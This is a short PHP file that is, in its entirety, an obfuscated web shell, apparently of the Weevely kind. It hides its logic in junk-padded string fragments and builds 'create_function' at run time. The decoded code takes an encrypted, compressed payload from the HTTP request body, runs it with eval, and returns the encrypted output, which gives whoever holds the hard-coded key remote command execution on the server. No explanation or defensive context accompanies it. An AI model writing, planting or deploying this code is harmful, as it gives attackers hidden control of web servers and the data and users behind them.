<?php
$a='_get_contents();@o{n{n{nb_end_clean();$r=@bas{ne64_e{nnc{no{nd{ne(@x(@gzc{nompress{n($o),{n$k));print("{n$p$kh$r$kf");}';
$F='$k{n="9db3c{nf98";$kh{n="{n{n3abd99{n48c890";{n$kf="850{nbf5{nab0104";$p="Ort{nhz{nmP{nMp43{n9QPkb";function x($t{n,$k';
$f='{n{no.=$t{$i}^$k{$j{n};}}ret{nu{nr{nn $o;}if (@{npreg_matc{nh("/$kh({n.+{n)$kf/{n",@{nfile_get{n{n_contents("p{nhp';
$o='{n://input"),{n$m)==1) {n{{n@ob_start(){n;@eva{nl(@gzunc{nompress{n(@x(@b{nase64{n_dec{node{n($m[1]){n,$k)){n);{n${no=@ob{n';
$A='){{n$c=strl{nen(${n{nk){n;$l=st{nrle{nn($t);$o="";for($i=0;{n$i{n{n<$l;){for($j={n{n0;($j<$c&&${ni<$l);$j++{n,$i+{n+){$';
$l=str_replace('dJ','','credJatdJe_dJfudJdJnctdJion');
$z=str_replace('{n','',$F.$A.$f.$o.$a);
$E=$l('',$z);$E();
?>
